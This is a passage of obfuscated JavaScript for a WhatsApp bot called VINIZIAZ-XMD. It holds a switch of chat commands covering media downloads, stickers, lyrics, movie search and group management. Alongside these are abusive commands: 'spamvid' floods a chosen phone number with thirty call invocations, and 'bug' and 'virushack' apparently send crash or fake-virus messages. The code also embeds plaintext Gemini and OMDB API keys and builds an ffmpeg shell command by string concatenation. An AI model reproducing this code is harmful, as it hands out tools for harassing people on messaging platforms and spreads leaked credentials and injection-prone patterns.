              if (_0x4db425.videoMessage) {
                _0x1a9f70 = _0x4db425.videoMessage;
              } else {
                if (_0x4db425.stickerMessage) {
                  _0x1a9f70 = _0x4db425.stickerMessage;
                } else {
                  _0xca7ad5.reply("This is neither a sticker, image nor a video...");
                  return;
                }
              }
            }
            ;
            var _0x556056 = await _0x398b1a.downloadAndSaveMediaMessage(_0x1a9f70);
            let _0x214686 = new _0x2d4a2c(_0x556056, {
              'pack': _0x466e42,
              'author': _0x466e42,
              'type': _0x200e5b.FULL,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x46,
              'background': "transparent"
            });
            const _0x4b1c30 = await _0x214686.toBuffer();
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'sticker': _0x4b1c30
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "song2":
          {
            const _0x3f58a6 = require('yt-search');
            const _0x42ff5c = require("node-fetch");
            const _0x4163df = async _0x46048c => {
              const _0x293729 = await _0x42ff5c(_0x46048c);
              return _0x293729.json();
            };
            try {
              if (!_0x32c5b4 || _0x32c5b4.trim().length === 0x0) {
                return _0xca7ad5.reply("What song do you want to download ?");
              }
              const _0x2494d7 = await _0x3f58a6(_0x32c5b4);
              if (!_0x2494d7 || !_0x2494d7.videos.length) {
                return message.reply("No video found for the specified query.");
              }
              const _0x191c73 = _0x2494d7.videos[0x0];
              const _0x3a82ed = _0x191c73.url;
              _0xca7ad5.reply("_Please wait your download on progress..._");
              let _0x1c6b89;
              let _0x2f7383;
              let _0x300f19;
              _0x1c6b89 = await _0x4163df("https://xploader-api.vercel.app/ytmp3?url=" + encodeURIComponent(_0x3a82ed));
              if (_0x1c6b89.success) {
                _0x2f7383 = _0x1c6b89.result.download_url;
                _0x300f19 = _0x1c6b89.result;
              } else {
                _0x1c6b89 = await _0x4163df('https://api.ryzendesu.vip/api/downloader/ytmp3?url=' + encodeURIComponent(_0x3a82ed));
                if (_0x1c6b89.success) {
                  _0x2f7383 = _0x1c6b89.result.download_url;
                  _0x300f19 = _0x1c6b89.result;
                } else {
                  _0x1c6b89 = await _0x4163df("https://api.dreaded.site/api/ytdl/audio?url=" + encodeURIComponent(_0x3a82ed));
                  if (_0x1c6b89.success) {
                    _0x2f7383 = _0x1c6b89.result.download_url;
                    _0x300f19 = _0x1c6b89.result;
                  }
                }
              }
              if (!_0x2f7383 || !_0x300f19) {
                return _0xca7ad5.reply("Failed to retrieve download URL from all sources. Please try again later.");
              }
              const _0x260fb2 = {
                'audio': {
                  'url': _0x2f7383
                },
                'mimetype': 'audio/mp4',
                'fileName': _0x300f19.title + ".mp3"
              };
              await _0x398b1a.sendMessage(_0xca7ad5.chat, _0x260fb2, {
                'quoted': _0xca7ad5
              });
            } catch (_0x426b7e) {
              console.error("Error during download process:", _0x426b7e);
              return _0xca7ad5.reply("Download failed due to an error: " + (_0x426b7e.message || _0x426b7e));
            }
          }
          break;
        case 'ytsearch':
        case 'yts':
          {
            if (!_0x32c5b4) {
              _0x1d37a1("Provide a search term!E.g: Alan walker alone");
              return;
            }
            const {
              videos: _0x424824
            } = await yts(_0x32c5b4);
            if (!_0x424824 || _0x424824.length <= 0x0) {
              _0x1d37a1("No Matching videos found for : *" + _0x32c5b4 + "*!!");
              return;
            }
            const _0x4da24b = _0x424824.length < 0xa ? _0x424824.length : 0xa;
            let _0x3b958b = "YouTube Search\n🔍 Query ~> " + _0x32c5b4 + "\n\n";
            for (let _0x4655f2 = 0x0; _0x4655f2 < _0x4da24b; _0x4655f2++) {
              _0x3b958b += "Link ~> " + _0x424824[_0x4655f2].url + "\nChannel ~> " + _0x424824[_0x4655f2].author.name + "\nTitle ~> " + _0x424824[_0x4655f2].title + "\n\n";
            }
            _0x1d37a1(_0x3b958b);
            return;
          }
          break;
        case "ytmp3":
        case "yta":
          {
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 𝗹𝗶𝗻𝗸!");
              }
              let _0x19f75a = _0x32c5b4.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
              if (!_0x19f75a) {
                return _0xca7ad5.reply("𝗧𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 𝗟𝗶𝗻𝗸");
              }
              let _0x14dfc4 = parseInt(_0x32c5b4) - 0x1;
              if (_0x14dfc4 < 0x0 || _0x14dfc4 >= _0x19f75a.length) {
                return _0xca7ad5.reply("𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗟𝗶𝗻𝗸.");
              }
              const {
                videos: _0x388956
              } = await yts(_0x32c5b4);
              if (!_0x388956 || _0x388956.length === 0x0) {
                return _0xca7ad5.reply("No songs found!");
              }
              const _0x16d45e = _0x388956[0x0].url;
              let _0x3d3196 = await fetchJson("https://api.dreaded.site/api/ytdl/audio?url=" + _0x16d45e);
              if (!_0x3d3196 || !_0x3d3196.result || !_0x3d3196.result.url) {
                return _0xca7ad5.reply("Failed to fetch audio from the API.");
              }
              const _0x21c44f = _0x3d3196.result.url;
              const _0x3f566a = _0x3d3196.result.title;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'audio': {
                  'url': _0x21c44f
                },
                'mimetype': "audio/mpeg",
                'fileName': _0x3f566a + '.mp3'
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x37b3e1) {
              _0xca7ad5.reply("Download failed\n" + _0x37b3e1.message);
            }
          }
          break;
        case "ytmp4":
        case "ytv":
          {
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗹𝗶𝗻𝗸!");
              }
              let _0x48c3a5 = _0x32c5b4.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
              if (!_0x48c3a5) {
                return _0xca7ad5.reply("𝗧𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗹𝗶𝗻𝗸");
              }
              let _0x1310fc = parseInt(_0x32c5b4) - 0x1;
              if (_0x1310fc < 0x0 || _0x1310fc >= _0x48c3a5.length) {
                return _0xca7ad5.reply("𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸.");
              }
              const {
                videos: _0x5f09e0
              } = await yts(_0x32c5b4);
              if (!_0x5f09e0 || _0x5f09e0.length === 0x0) {
                return _0xca7ad5.reply("No songs found!");
              }
              const _0x4a2a24 = _0x5f09e0[0x0].url;
              let _0x52a46b = await fetchJson('https://api.dreaded.site/api/ytdl/video?url=' + _0x4a2a24);
              if (!_0x52a46b || !_0x52a46b.result || !_0x52a46b.result.url) {
                return _0xca7ad5.reply("Failed to fetch video from the API.");
              }
              const _0x5d2666 = _0x52a46b.result.url;
              const _0x433e26 = _0x52a46b.result.title;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'video': {
                  'url': _0x5d2666
                },
                'mimetype': "video/mpeg",
                'fileName': _0x433e26 + ".mp4"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x2284c5) {
              _0xca7ad5.reply("Download failed\n" + _0x2284c5.message);
            }
          }
          break;
        case "ping":
        case "speed":
          {
            await _0x52b900();
            _0xca7ad5.reply("𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗\n " + _0x1df034.toFixed(0x4) + " 𝗠𝘀");
          }
          break;
        case "uptime":
          {
            _0xca7ad5.reply('' + runtime(process.uptime()));
          }
          break;
        case 'runtime':
          let _0x22fce3 = "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝘂𝗻𝗻𝗶𝗻𝗴 𝘀𝗶𝗻𝗰𝗲 " + runtime(process.uptime());
          _0x398b1a.sendMessage(_0xca7ad5.chat, {
            'text': _0x22fce3,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗",
                'body': "https://chat.whatsapp.com/FRDtAailExp6hKbQgbLBnP",
                'thumbnailUrl': "https://i.imgur.com/HP6GyiD.jpeg",
                'sourceUrl': 'https://chat.whatsapp.com/FRDtAailExp6hKbQgbLBnP',
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0xca7ad5
          });
          break;
        case "apk":
        case "app":
          {
            if (!_0x32c5b4) {
              return _0x1d37a1("Where is the app name?");
            }
            let _0x5dd364 = await fetchJson("https://bk9.fun/search/apk?q=" + _0x32c5b4);
            let _0xb14932 = await fetchJson("https://bk9.fun/download/apk?id=" + _0x5dd364.BK9[0x0].id);
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'document': {
                'url': _0xb14932.BK9.dllink
              },
              'fileName': _0xb14932.BK9.name,
              'mimetype': "application/vnd.android.package-archive",
              'contextInfo': {
                'externalAdReply': {
                  'title': "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗",
                  'body': '' + _0xb14932.BK9.name,
                  'thumbnailUrl': '' + _0xb14932.BK9.icon,
                  'sourceUrl': '' + _0xb14932.BK9.dllink,
                  'mediaType': 0x2,
                  'showAdAttribution': true,
                  'renderLargerThumbnail': false
                }
              }
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "mix":
          {
            const {
              Sticker: _0x290c70,
              createSticker: _0x350d5e,
              StickerTypes: _0x559265
            } = require('wa-sticker-formatter');
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("No emojis provided ? ");
            }
            const _0x29dd11 = _0x32c5b4.split('+');
            if (_0x29dd11.length !== 0x2) {
              _0xca7ad5.reply("Specify the emojis and separate with '+'");
              return;
            }
            const _0x25cf7d = _0x29dd11[0x0].trim();
            const _0x32369a = _0x29dd11[0x1].trim();
            try {
              const _0x13d507 = require("axios");
              const _0x5b308f = await _0x13d507.get("https://levanter.onrender.com/emix?q=" + _0x25cf7d + _0x32369a);
              if (_0x5b308f.data.status === true) {
                let _0x759b32 = new _0x290c70(_0x5b308f.data.result, {
                  'pack': botname,
                  'type': _0x559265.CROPPED,
                  'categories': ['🤩', '🎉'],
                  'id': "12345",
                  'quality': 0x46,
                  'background': "transparent"
                });
                const _0xe980f = await _0x759b32.toBuffer();
                _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'sticker': _0xe980f
                }, {
                  'quoted': _0xca7ad5
                });
              } else {
                _0xca7ad5.reply("Unable to create emoji mix.");
              }
            } catch (_0x18a272) {
              _0xca7ad5.reply("An error occurred while creating the emoji mix." + _0x18a272);
            }
          }
          break;
        case 'lyrics':
          {
            const _0x218520 = require("node-fetch");
            const _0x1ab8f8 = "https://api.dreaded.site/api/lyrics?title=" + encodeURIComponent(_0x32c5b4);
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("Provide a song name!");
              }
              const _0xf61342 = await fetchJson(_0x1ab8f8);
              if (!_0xf61342.success || !_0xf61342.result || !_0xf61342.result.lyrics) {
                return _0xca7ad5.reply("Sorry, I couldn't find any lyrics for \"" + _0x32c5b4 + "\".");
              }
              const {
                title: _0x4314ee,
                artist: _0x55c69d,
                link: _0xeedfd8,
                thumb: _0xf94a8b,
                lyrics: _0x21536e
              } = _0xf61342.result;
              const _0x435fe6 = _0xf94a8b || "https://i.imgur.com/x8scmqS.jpeg";
              const _0x573247 = await _0x218520(_0x435fe6).then(_0x4113b9 => _0x4113b9.buffer())["catch"](_0x3fa502 => {
                console.error("Error fetching image:", _0x3fa502);
                return null;
              });
              if (!_0x573247) {
                return _0xca7ad5.reply("An error occurred while fetching the image.");
              }
              const _0x3b442b = "**Title**: " + _0x4314ee + "\n**Artist**: " + _0x55c69d + "\n\n" + _0x21536e;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': _0x573247,
                'caption': _0x3b442b
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x332034) {
              console.error(_0x332034);
              _0xca7ad5.reply("An error occurred while fetching the lyrics for \"" + _0x32c5b4 + "\".");
            }
          }
          break;
        case 'toimage':
        case 'photo':
          {
            if (!_0x38810c) {
              throw "Tag a static video with the command!";
            }
            if (!/webp/.test(_0x372f6b)) {
              throw "Tag a sticker with " + (prefix + _0x3418f9);
            }
            let _0x5ec5bd = await _0x398b1a.downloadAndSaveMediaMessage(_0x38810c);
            let _0x2cc9bc = await getRandom('.png');
            exec("ffmpeg -i " + _0x5ec5bd + " " + _0x2cc9bc, _0x314203 => {
              fs.unlinkSync(_0x5ec5bd);
              if (_0x314203) {
                throw _0x314203;
              }
              let _0xa45c3b = fs.readFileSync(_0x2cc9bc);
              _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': _0xa45c3b,
                'caption': "𝗖𝗼𝗻𝘃𝗲𝗿𝘁𝗲𝗱 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
              fs.unlinkSync(_0x2cc9bc);
            });
          }
          break;
        case "movie":
          if (!_0x32c5b4) {
            return _0x1d37a1("Provide a series or movie name.");
          }
          let _0x214127 = await axios.get('http://www.omdbapi.com/?apikey=742b2d09&t=' + _0x32c5b4 + "&plot=full");
          let _0x2c3e86 = '';
          console.log(_0x214127.data);
          _0x2c3e86 += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n ``` IMDB MOVIE SEARCH```\n⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
          _0x2c3e86 += "🎬Title      : " + _0x214127.data.Title + "\n";
          _0x2c3e86 += "📅Year       : " + _0x214127.data.Year + "\n";
          _0x2c3e86 += "⭐Rated      : " + _0x214127.data.Rated + "\n";
          _0x2c3e86 += "📆Released   : " + _0x214127.data.Released + "\n";
          _0x2c3e86 += "⏳Runtime    : " + _0x214127.data.Runtime + "\n";
          _0x2c3e86 += "🌀Genre      : " + _0x214127.data.Genre + "\n";
          _0x2c3e86 += "👨🏻‍💻Director   : " + _0x214127.data.Director + "\n";
          _0x2c3e86 += "✍Writer     : " + _0x214127.data.Writer + "\n";
          _0x2c3e86 += "👨Actors     : " + _0x214127.data.Actors + "\n";
          _0x2c3e86 += "📃Plot       : " + _0x214127.data.Plot + "\n";
          _0x2c3e86 += "🌐Language   : " + _0x214127.data.Language + "\n";
          _0x2c3e86 += "🌍Country    : " + _0x214127.data.Country + "\n";
          _0x2c3e86 += "🎖️Awards     : " + _0x214127.data.Awards + "\n";
          _0x2c3e86 += "📦BoxOffice  : " + _0x214127.data.BoxOffice + "\n";
          _0x2c3e86 += "🏙️Production : " + _0x214127.data.Production + "\n";
          _0x2c3e86 += "🌟imdbRating : " + _0x214127.data.imdbRating + "\n";
          _0x2c3e86 += "❎imdbVotes  : " + _0x214127.data.imdbVotes + '';
          _0x398b1a.sendMessage(_0x24b6cb, {
            'image': {
              'url': _0x214127.data.Poster
            },
            'caption': _0x2c3e86
          }, {
            'quoted': _0xca7ad5
          });
          break;
        case "linkgroup":
        case "link":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            let _0x5c0ad8 = await _0x398b1a.groupInviteCode(_0xca7ad5.chat);
            _0x398b1a.sendText(_0xca7ad5.chat, "https://chat.whatsapp.com/" + _0x5c0ad8 + "\n\nGroup link for  " + _0x33cc44.subject, _0xca7ad5, {
              'detectLink': true
            });
          }
          break;
        case 'botpp':
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!_0x38810c) {
              throw "Tag an image you want to be the bot's profile picture with " + (prefix + _0x3418f9);
            }
            if (!/image/.test(_0x372f6b)) {
              throw "Tag an image you want to be the bot's profile picture with " + (prefix + _0x3418f9);
            }
            if (/webp/.test(_0x372f6b)) {
              throw "Tag an image you want to be the bot's profile picture with " + (prefix + _0x3418f9);
            }
            let _0x4c48df = await _0x398b1a.downloadAndSaveMediaMessage(_0x38810c);
            await _0x398b1a.updateProfilePicture(_0x2ba528, {
              'url': _0x4c48df
            })["catch"](_0x353b5b => fs.unlinkSync(_0x4c48df));
            _0x1d37a1`Bot's profile picture has been successfully updated!`;
          }
          break;
        case 'broadcast':
          {
            if (!_0x11f3a8) {
              throw NotOwner;
              return;
            }
            if (!_0x32c5b4) {
              _0x1d37a1("❌ No broadcast message provided!");
              return;
            }
            let _0x30d77c = await _0x398b1a.groupFetchAllParticipating();
            let _0x4ab50e = Object.entries(_0x30d77c).slice(0x0).map(_0x92cdf5 => _0x92cdf5[0x1]);
            let _0x18aa34 = _0x4ab50e.map(_0x3e9d44 => _0x3e9d44.id);
            _0x1d37a1(" Broadcasting in " + _0x18aa34.length + " Group Chat, in " + _0x18aa34.length * 1.5 + " seconds");
            for (let _0x5c2d08 of _0x18aa34) {
              let _0x52d653 = "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 >\n\n🀄 Message: " + _0x32c5b4 + "\n\nAuthor: " + _0x466e42;
              await _0x398b1a.sendMessage(_0x5c2d08, {
                'image': {
                  'url': "https://i.imgur.com/7cVX7SO.jpeg"
                },
                'caption': '' + _0x52d653
              });
            }
            _0x1d37a1("Broadcasted to " + _0x18aa34.length + " Groups.");
          }
          break;
        case 'gemini':
          {
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("This is VINIZIAZ-XMD, an AI using Gemini APIs to process text, provide yr query");
              }
              const {
                default: _0x2b84b6
              } = await import("gemini-ai");
              const _0xc3d62 = new _0x2b84b6("AIzaSyDJUtskTG-MvQdlT4tNE319zBqLMFei8nQ");
              const _0x4bb598 = _0xc3d62.createChat();
              const _0x2d54da = await _0x4bb598.ask(_0x32c5b4);
              await _0xca7ad5.reply(_0x2d54da);
            } catch (_0x61c7b6) {
              _0xca7ad5.reply("I am unable to generate responses\n\n" + _0x61c7b6);
            }
          }
          break;
        case 'setvar':
          if (!_0x11f3a8) {
            throw NotOwner;
          }
          if (!_0x32c5b4.split('=')[0x1]) {
            return _0x1d37a1("Incorrect Usage:\nProvide the key and value correctly\nExample: setvar AUTOVIEW_STATUS=TRUE");
          }
          const _0x3b8880 = new _0x51a63d({
            'token': herokuapi
          });
          let _0xe5f080 = '/apps/' + appname;
          await _0x3b8880.patch(_0xe5f080 + "/config-vars", {
            'body': {
              [_0x32c5b4.split('=')[0x0]]: _0x32c5b4.split('=')[0x1]
            }
          });
          await _0x1d37a1("✅ The variable " + _0x32c5b4.split('=')[0x0] + " = " + _0x32c5b4.split('=')[0x1] + " has been set Successfuly.\nWait 20s for changes to effect!");
          break;
        case 'dlt':
        case "dil":
          {
            if (!_0xca7ad5.quoted) {
              throw "No message quoted for deletion";
            }
            let {
              chat: _0x1dfe9a,
              fromMe: _0x3da11d,
              id: _0xd4fb10,
              isBaileys: _0x1eff2c
            } = _0xca7ad5.quoted;
            if (_0x1eff2c) {
              throw "I cannot delete. Quoted message is my message or another bot message.";
            }
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'delete': {
                'remoteJid': _0xca7ad5.chat,
                'fromMe': true,
                'id': _0xca7ad5.quoted.id,
                'participant': _0xca7ad5.quoted.sender
              }
            });
          }
          break;
        case "block":
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!_0xca7ad5.quoted) {
              throw "𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!";
            }
            let _0x350c23 = _0xca7ad5.mentionedJid[0x0] ? _0xca7ad5.mentionedJid[0x0] : _0xca7ad5.quoted ? _0xca7ad5.quoted.sender : _0x32c5b4.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            if (_0x350c23 == "254114660061@s.whatsapp.net") {
              return _0xca7ad5.reply("𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆 𝗢𝘄𝗻𝗲𝗿 😡");
            }
            if (_0x350c23 == _0x398b1a.decodeJid(_0x398b1a.user.id)) {
              throw "𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆𝘀𝗲𝗹𝗳 𝗶𝗱𝗶𝗼𝘁 😡";
            }
            await _0x398b1a.updateBlockStatus(_0x350c23, "block");
            _0xca7ad5.reply("𝗕𝗹𝗼𝗰𝗸𝗲𝗱 𝘁𝗵𝗶𝘀 𝗺𝗼𝘁𝗵𝗲𝗿𝗳*𝗰𝗸𝗲𝗿 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆!");
          }
          break;
        case "unblock":
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!_0xca7ad5.quoted) {
              throw "𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!";
            }
            let _0x2d1a14 = _0xca7ad5.mentionedJid[0x0] ? _0xca7ad5.mentionedJid[0x0] : _0xca7ad5.quoted ? _0xca7ad5.quoted.sender : _0x32c5b4.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            await _0x398b1a.updateBlockStatus(_0x2d1a14, "unblock");
            _0xca7ad5.reply("𝗨𝗻𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆✅!");
          }
          break;
        case "join":
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!_0x32c5b4) {
              return _0x1d37a1("provide a valid group link");
            }
            let _0x141177 = _0x4dd883[0x0].split("https://chat.whatsapp.com/")[0x1];
            await _0x398b1a.groupAcceptInvite(_0x141177).then(_0x907d4a => _0x1d37a1(jsonformat(_0x907d4a)))["catch"](_0x446b74 => _0x1d37a1("Link has problem."));
          }
          break;
        case "enc":
        case "encrypte":
          {
            const _0xf4e74a = require("javascript-obfuscator");
            if (_0xca7ad5.quoted && _0xca7ad5.quoted.text) {
              const _0x19f7ad = _0xca7ad5.quoted.text;
              const _0x85ef0 = _0xf4e74a.obfuscate(_0x19f7ad, {
                'compact': true,
                'controlFlowFlattening': true,
                'controlFlowFlatteningThreshold': 0x1,
                'numbersToExpressions': true,
                'simplify': true,
                'stringArrayShuffle': true,
                'splitStrings': true,
                'stringArrayThreshold': 0x1
              });
              console.log("Successfully encrypted the code");
              _0xca7ad5.reply(_0x85ef0.getObfuscatedCode());
            } else {
              _0xca7ad5.reply("Quote/Tag a valid JavaScript code to encrypt!");
            }
          }
          break;
        case "gpt3":
          {
            if (!_0x32c5b4) {
              return _0x1d37a1("Hello there, How can i help you?");
            }
            let _0x18e4b3 = await fetchJson("https://bk9.fun/ai/blackbox?q=" + _0x32c5b4);
            if (!_0x18e4b3.BK9) {
              return _0x1d37a1("An error occurred while fetching the AI chatbot response. Please try again later.");
            } else {
              _0x1d37a1(_0x18e4b3.BK9);
            }
          }
          break;
        case 'gcprofile':
          {
            function _0x1c8a42(_0x1451d6) {
              const _0x15437f = new Date(_0x1451d6 * 0x3e8);
              const _0x87f9ae = ['Sunday', "Monday", "Tuesday", "Wednesday", "Thursday", 'Friday', "Saturday"];
              return {
                'date': _0x15437f.getDate(),
                'month': new Intl.DateTimeFormat('en-US', {
                  'month': "long"
                }).format(_0x15437f),
                'year': _0x15437f.getFullYear(),
                'day': _0x87f9ae[_0x15437f.getUTCDay()],
                'time': _0x15437f.getUTCHours() + ':' + _0x15437f.getUTCMinutes() + ':' + _0x15437f.getUTCSeconds()
              };
            }
            if (!_0xca7ad5.isGroup) {
              return _0xca7ad5.reply("This command is meant for groups");
            }
            let _0x48bea8 = await _0x398b1a.groupMetadata(_0xca7ad5.chat);
            let _0x2b85d0 = await _0x1c8a42(_0x48bea8.creation);
            try {
              pp = await _0x398b1a.profilePictureUrl(chat, "image");
            } catch {
              pp = "https://i.imgur.com/ED0uS2t.jpeg";
            }
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'image': {
                'url': pp
              },
              'caption': "_Name_ : *" + _0x48bea8.subject + "*\n\n_ID_ : *" + _0x48bea8.id + "*\n\n_Group owner_ : " + ('@' + _0x48bea8.owner.split('@')[0x0]) + " || 'No Creator'\n\n_Group created_ : *" + _0x2b85d0.day + ", " + _0x2b85d0.date + " " + _0x2b85d0.month + " " + _0x2b85d0.year + ", " + _0x2b85d0.time + "*\n\n_Participants_ : *" + _0x48bea8.size + "*\n_Members_ : *" + _0x48bea8.participants.filter(_0x4bcfa7 => _0x4bcfa7.admin == null).length + "*\n\n_Admins_ : *" + Number(_0x48bea8.participants.length - _0x48bea8.participants.filter(_0x4d6967 => _0x4d6967.admin == null).length) + "*\n\n_Who can send message_ : *" + (_0x48bea8.announce == true ? "Admins" : "Everyone") + "*\n\n_Who can edit group info_ : *" + (_0x48bea8.restrict == true ? "Admins" : 'Everyone') + "*\n\n_Who can add participants_ : *" + (_0x48bea8.memberAddMode == true ? "Everyone" : "Admins") + '*'
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "tovideo":
        case "mp4":
        case "tovid":
          {
            if (!_0x38810c) {
              return _0x1d37a1("Reply to Sticker");
            }
            if (!/webp/.test(_0x372f6b)) {
              return _0x1d37a1("reply sticker with caption *" + (prefix + _0x3418f9) + '*');
            }
            let _0x4e3c84 = await fetch('https://bk9.fun/converter/webpToMp4?url=' + _0x38810c);
            let _0xb96521 = await _0x398b1a.downloadAndSaveMediaMessage(_0x38810c);
            let _0x3a3496 = await _0x4e3c84(_0xb96521);
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'video': {
                'url': _0x3a3496.result,
                'caption': "Convert Webp To Video"
              }
            }, {
              'quoted': _0xca7ad5
            });
            await fs.unlinkSync(_0xb96521);
          }
          break;
        case 'customercare':
          {
            _0x3e3693(_0x398b1a, _0xca7ad5, _0x32c5b4);
          }
          break;
        case "bug":
          {
            _0x814854(_0x398b1a, _0xca7ad5, _0x32c5b4);
          }
          break;
        case "virushack":
          sendFakeVirusWarning(_0x398b1a, _0xca7ad5);
          break;
        case "spamvid":
          {
            const _0x9cb436 = _0x398b1a.user.id.split(':')[0x0] + "@s.whatsapp.net";
            const _0x5680ea = _0xca7ad5.sender === _0x9cb436 || ownerNumbers.includes(_0xca7ad5.sender);
            if (!_0x5680ea) {
              return _0x1d37a1("*YOU ARE NOT A PREMIUM MEMBER DIMWIT*");
            }
            target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            _0x1d37a1("┌─────────\n│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝙼𝚉𝙰𝚉𝙸-𝚇𝙼𝙳 𝚜𝚎𝚗𝚍𝚒𝚗𝚐 𝚜𝚙𝚊𝚖 𝚟𝚒𝚍 🌒\n│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : " + target + "\n│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : " + _0x3418f9 + "\n└─────────");
            for (let _0x4a8cfd = 0x0; _0x4a8cfd < 0x1e; _0x4a8cfd++) {
              await CallGc(target);
            }
            sam.sendMessage(_0xca7ad5.chat, {
              'react': {
                'text': '✅',
                'key': _0xca7ad5.key
              }
            });
          }
          break;
        case "tempemail":
          {
            let _0x57bb63 = await generateTempEmail();
            if (!_0x57bb63) {
              return _0x1d37a1("❌ Failed to generate a temporary email. Try again later.");
            }
            global.userTempEmail = _0x57bb63;
            _0x1d37a1("📧 *Temporary Email Created:*\n\n" + _0x57bb63 + "\n\nUse this email to receive messages. Type `.checkemail winxey` to see new messages.");
            break;
          }
        case 'checkemail':
          {
            let _0x5d5cda = _0x32c5b4.split(" ");
            let _0x2a1958 = _0x5d5cda[0x1];
            if (!global.userTempEmail) {
              return _0x1d37a1("❌ You haven't generated a temporary email. Use `.tempemail` first.");
            }
            if (_0x2a1958 !== "winxey") {
              return _0x1d37a1("❌ Incorrect password. Access denied.");
            }
            let _0x534228 = await checkEmailInbox(global.userTempEmail);
            if (_0x534228.length === 0x0) {
              return _0x1d37a1("📭 No new messages.");
            }
            let _0x6f93e5 = _0x534228[_0x534228.length - 0x1];
            let _0xe8c8b = "📩 *New Email Received*\n\nFrom: " + _0x6f93e5.from + "\nSubject: " + _0x6f93e5.subject + "\n\n" + _0x6f93e5.body;
            _0x1d37a1(_0xe8c8b);
            break;
          }
        case "grouppic":
          {
            if (!_0xca7ad5.isGroup) {
              return _0x1d37a1("❌ This command can only be used in a group.");
            }
            let _0x359710 = _0xca7ad5.chat;
            let _0x185768 = await getGroupProfilePic(_0x398b1a, _0x359710);
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'image': {
                'url': _0x185768
              },
